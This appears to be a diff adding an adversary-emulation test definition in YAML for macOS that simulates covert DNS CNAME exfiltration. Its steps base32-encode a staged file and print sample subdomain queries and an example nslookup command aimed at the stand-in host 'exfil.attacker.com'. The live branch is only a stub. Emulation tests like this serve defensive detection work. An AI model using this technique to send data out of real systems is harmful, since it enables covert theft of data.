@@ -1,0 +1,138 @@
+id: 017-dns-cname-exfiltration
+name: DNS CNAME Exfiltration
+description: Covert DNS exfiltration using CNAME records and DNS resolution
+api_version: 2.0
+platforms:
+  - os: darwin
+uuid: e7f8a0b1-c210-4d3e-4f5a-6b7c8d9e0f10
+requirements:
+  platforms:
+    - os: darwin
+      min_version: 10.12
+args:
+  data_file:
+    description: File to exfiltrate via DNS
+    type: string
+    default: "/tmp/.staging/data.tar.gz"
+  dns_domain:
+    description: Attacker-controlled DNS domain
+    type: string
+    default: "exfil.attacker.com"
+  subdomain_prefix:
+    description: Prefix for exfiltration subdomains
+    type: string
+    default: "data"
+  chunk_size:
+    description: Size of data chunks
+    type: string
+    default: "32"
+  dry_run:
+    description: Enable dry-run mode
+    type: string
+    default: "true"
+steps:
+  - name: Verify file exists
+    type: command
+    executor: bash
+    command: test -f '{{ args.data_file }}' || (echo "File not found"; exit 1)
+    cleanup: false
+  
+  - name: Prepare data encoding
+    type: command
+    executor: bash
+    command: |
+      echo "DNS CNAME Exfiltration Setup:"
+      echo "  File: $(basename '{{ args.data_file }}')"
+      echo "  Size: $(du -h '{{ args.data_file }}' | cut -f1)"
+      echo "  Domain: {{ args.dns_domain }}"
+      echo "  Chunk size: {{ args.chunk_size }} bytes"
+      
+      filesize=$(stat -f%z '{{ args.data_file }}' 2>/dev/null || stat -c%s '{{ args.data_file }}')
+      queries=$((filesize / {{ args.chunk_size }} + 1))
+      echo "  Estimated DNS queries: $queries"
+    cleanup: false
+  
+  - name: Generate DNS query list
+    type: command
+    executor: bash
+    command: |
+      if [ -f '{{ args.data_file }}' ]; then
+        echo "Generating DNS query list..."
+        
+        # Extract and encode file data
+        data=$(base32 < '{{ args.data_file }}')
+        
+        # Generate subdomains
+        echo "Sample DNS queries:"
+        echo "  {{ args.subdomain_prefix }}-00001.{{ args.dns_domain }}"
+        echo "  {{ args.subdomain_prefix }}-00002.{{ args.dns_domain }}"
+        echo "  {{ args.subdomain_prefix }}-00003.{{ args.dns_domain }}"
+        echo "  ..."
+      fi
+    cleanup: false
+  
+  - name: Execute DNS exfiltration
+    type: command
+    executor: bash
+    command: |
+      if [ '{{ args.dry_run }}' = 'true' ]; then
+        echo "DRY RUN: DNS CNAME Exfiltration"
+        echo "Process:"
+        echo "  1. Encode file in base32"
+        echo "  2. Split into {{ args.chunk_size }}-byte chunks"
+        echo "  3. Create subdomains: chunk.{{ args.dns_domain }}"
+        echo "  4. Issue DNS queries for CNAME resolution"
+        echo ""
+        echo "Example command:"
+        echo "  nslookup {{ args.subdomain_prefix }}-00001.{{ args.dns_domain }}"
+        echo ""
+        echo "Attacker analyzes DNS logs to extract data"
+      else
+        echo "Initiating DNS exfiltration..."
+        # This would implement actual DNS tunneling
+        echo "NOTE: Requires attacker-controlled DNS server"
+      fi
+    cleanup: false
+checks:
+  - name: File exists
+    description: Verify file for exfiltration
+    type: command
+    command: test -f '{{ args.data_file }}'
+  
+  - name: Valid domain name
+    description: Verify domain format
+    type: command
+    command: echo '{{ args.dns_domain }}' | grep -qE '^[a-zA-Z0-9.-]+\.[a-z]{2,}$' && echo "Valid domain"
+tests:
+  dry_run:
+    - name: Test DNS CNAME exfiltration (simulation)
+      description: Test DNS exfiltration via CNAME
+      type: basic
+      steps:
+        - name: Create test data
+          type: command
+          executor: bash
+          command: echo "DNS exfiltration test data" > /tmp/test_dns_cname.dat
+        
+        - name: Encode test data
+          type: command
+          executor: bash
+          command: |
+            echo "Encoded data (base32):"
+            base32 < /tmp/test_dns_cname.dat | head -c 64
+            echo ""
+        
+        - name: Generate sample DNS queries
+          type: command
+          executor: bash
+          command: |
+            echo "Sample DNS CNAME queries:"
+            for i in {1..3}; do
+              printf "  data-%05d.exfil.attacker.com\n" $i
+            done
+cleanup:
+  - name: Remove test data
+    type: command
+    executor: bash
+    command: rm -f /tmp/test_dns_cname.dat
+    ignore_errors: true
